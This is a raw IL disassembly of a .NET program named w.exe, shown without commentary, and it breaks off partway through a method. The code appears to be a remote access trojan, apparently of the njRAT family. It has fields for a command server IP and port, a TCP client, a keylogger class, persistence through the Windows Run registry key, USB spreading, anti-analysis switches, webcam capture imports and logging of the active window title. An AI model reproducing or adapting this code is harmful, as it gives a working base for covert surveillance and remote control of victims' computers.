
//  Microsoft (R) .NET Framework IL Disassembler.  Version 2.0.50727.42
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32
.module extern user32.dll
.module extern winmm.dll
.module extern avicap32.dll
.module extern kernel32
.module extern ntdll
.module extern KERNEL32.DLL
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly w
{

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module w.exe
// MVID: {DE43B3B7-5CF8-4642-ADF5-C66021041D62}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x003F0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi w.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method MyApplication::.ctor

} // end of class w.My.MyApplication

.class private auto ansi w.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method MyComputer::.ctor

} // end of class w.My.MyComputer

.class private auto ansi sealed beforefieldinit w.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init ([0] bool Equals)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0010

      IL_0010:  ldloc.0
      IL_0011:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init ([0] int32 GetHashCode)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init ([0] class [mscorlib]System.Type GetType)
      IL_0000:  nop
      IL_0001:  ldtoken    w.My.MyProject/MyWebServices
      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000b:  stloc.0
      IL_000c:  br.s       IL_000e

      IL_000e:  ldloc.0
      IL_000f:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init ([0] string ToString)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance string [mscorlib]System.Object::ToString()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       32 (0x20)
      .maxstack  2
      .locals init ([0] !!T Create__Instance__,
               [1] bool VB$CG$t_bool$S0)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  box        !!T
      IL_0007:  ldnull
      IL_0008:  ceq
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  brfalse.s  IL_0018

      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_0013:  stloc.0
      IL_0014:  br.s       IL_001e

      IL_0016:  br.s       IL_001d

      IL_0018:  nop
      IL_0019:  ldarg.0
      IL_001a:  stloc.0
      IL_001b:  br.s       IL_001e

      IL_001d:  nop
      IL_001e:  ldloc.0
      IL_001f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init ([0] !!T VB$t_generic$S0)
      IL_0000:  nop
      IL_0001:  ldarg.1
      IL_0002:  ldloca.s   VB$t_generic$S0
      IL_0004:  initobj    !!T
      IL_000a:  ldloc.0
      IL_000b:  stobj      !!T
      IL_0010:  nop
      IL_0011:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       38 (0x26)
      .maxstack  2
      .locals init ([0] !T GetInstance,
               [1] bool VB$CG$t_bool$S0)
      IL_0000:  nop
      IL_0001:  ldsfld     !0 class w.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0006:  box        !T
      IL_000b:  ldnull
      IL_000c:  ceq
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  brfalse.s  IL_001c

      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0017:  stsfld     !0 class w.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001c:  ldsfld     !0 class w.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0021:  stloc.0
      IL_0022:  br.s       IL_0024

      IL_0024:  ldloc.0
      IL_0025:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       10 (0xa)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  nop
      IL_0009:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T w.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyApplication> m_AppObjectProvider
  .field private static initonly class w.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  newobj     instance void class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyComputer> w.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyApplication> w.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class w.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> w.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyProject/MyWebServices> w.My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  nop
    IL_0029:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class w.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class w.My.MyComputer Computer)
    IL_0000:  nop
    IL_0001:  ldsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyComputer> w.My.MyProject::m_ComputerObjectProvider
    IL_0006:  callvirt   instance !0 class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyComputer>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class w.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class w.My.MyApplication Application)
    IL_0000:  nop
    IL_0001:  ldsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyApplication> w.My.MyProject::m_AppObjectProvider
    IL_0006:  callvirt   instance !0 class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyApplication>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User User)
    IL_0000:  nop
    IL_0001:  ldsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> w.My.MyProject::m_UserObjectProvider
    IL_0006:  callvirt   instance !0 class w.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class w.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class w.My.MyProject/MyWebServices WebServices)
    IL_0000:  nop
    IL_0001:  ldsfld     class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyProject/MyWebServices> w.My.MyProject::m_MyWebServicesObjectProvider
    IL_0006:  callvirt   instance !0 class w.My.MyProject/ThreadSafeObjectProvider`1<class w.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_WebServices

  .property class w.My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class w.My.MyComputer w.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class w.My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class w.My.MyApplication w.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User w.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class w.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class w.My.MyProject/MyWebServices w.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class w.My.MyProject

.class public auto ansi w.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void w.OK::ko()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method A::main

} // end of class w.A

.class public auto ansi beforefieldinit w.OK
       extends [mscorlib]System.Object
{
  .field public static string TIP
  .field public static string Tport
  .field public static int32 delay
  .field public static bool udp
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field private static string H
  .field public static string HH
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class w.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static int32 NH
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string sizk
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .field public static bool HD
  .field public static string anti
  .field public static bool anti2
  .field public static bool usb
  .field public static string usbx
  .field public static bool task
  .field public static class w.mgr mg
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       384 (0x180)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] w.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool w.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool w.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string w.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string w.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
    IL_0048:  ldsfld     string w.OK::HH
    IL_004d:  call       object w.OK::MH(string)
    IL_0052:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0057:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_005c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0061:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0066:  stsfld     string w.OK::H
    IL_006b:  ldstr      "[H]"
    IL_0070:  stsfld     string w.OK::HH
    IL_0075:  ldstr      "[Idr]"
    IL_007a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007f:  stsfld     bool w.OK::Idr
    IL_0084:  ldstr      "[Isf]"
    IL_0089:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_008e:  stsfld     bool w.OK::IsF
    IL_0093:  ldstr      "[Isu]"
    IL_0098:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_009d:  stsfld     bool w.OK::Isu
    IL_00a2:  ldnull
    IL_00a3:  stsfld     class w.kl w.OK::kq
    IL_00a8:  ldstr      ""
    IL_00ad:  stsfld     string w.OK::lastcap
    IL_00b2:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_00b7:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_00bc:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_00c1:  stsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
    IL_00c6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00cb:  stsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
    IL_00d0:  ldnull
    IL_00d1:  stsfld     object w.OK::MT
    IL_00d6:  ldc.i4.0
    IL_00d7:  stsfld     int32 w.OK::NH
    IL_00dc:  ldstr      "[P]"
    IL_00e1:  stsfld     string w.OK::P
    IL_00e6:  ldnull
    IL_00e7:  stsfld     object w.OK::PLG
    IL_00ec:  ldstr      "[RG]"
    IL_00f1:  stsfld     string w.OK::RG
    IL_00f6:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00fb:  stsfld     string w.OK::sf
    IL_0100:  ldstr      "[klen]"
    IL_0105:  stsfld     string w.OK::sizk
    IL_010a:  ldstr      "[VN]"
    IL_010f:  stsfld     string w.OK::VN
    IL_0114:  ldstr      "im523"
    IL_0119:  stsfld     string w.OK::VR
    IL_011e:  ldstr      "|'|'|"
    IL_0123:  stsfld     string w.OK::Y
    IL_0128:  ldstr      "[HD]"
    IL_012d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0132:  stsfld     bool w.OK::HD
    IL_0137:  ldstr      "[anti3]"
    IL_013c:  stsfld     string w.OK::anti
    IL_0141:  ldstr      "[anti2]"
    IL_0146:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_014b:  stsfld     bool w.OK::anti2
    IL_0150:  ldstr      "[usb]"
    IL_0155:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_015a:  stsfld     bool w.OK::usb
    IL_015f:  ldstr      "[usbx]"
    IL_0164:  stsfld     string w.OK::usbx
    IL_0169:  ldstr      "[task]"
    IL_016e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0173:  stsfld     bool w.OK::task
    IL_0178:  ldnull
    IL_0179:  stsfld     class w.mgr w.OK::mg
    IL_017e:  nop
    IL_017f:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::.ctor

  .method private static void  im(object a0) cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  castclass  uint8[]
    IL_0007:  call       void w.OK::Ind(uint8[])
    IL_000c:  nop
    IL_000d:  nop
    IL_000e:  ret
  } // end of method OK::im

  .method private static void  im(object a0,
                                  class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void w.OK::ED()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::im

  .method public static string  ACT() cil managed
  {
    // Code size       107 (0x6b)
    .maxstack  3
    .locals init ([0] string ACT,
             [1] string str,
             [2] native int foregroundWindow,
             [3] string winTitle,
             [4] class [mscorlib]System.Exception exception1,
             [5] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int w.OK::GetForegroundWindow()
      IL_0007:  stloc.2
      IL_0008:  ldloc.2
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.s    VB$CG$t_bool$S0
      IL_0015:  ldloc.s    VB$CG$t_bool$S0
      IL_0017:  brfalse.s  IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0069

      IL_0021:  nop
      IL_0022:  ldloc.2
      IL_0023:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0028:  call       int32 w.OK::GetWindowTextLength(int64)
      IL_002d:  ldc.i4.1
      IL_002e:  add.ovf
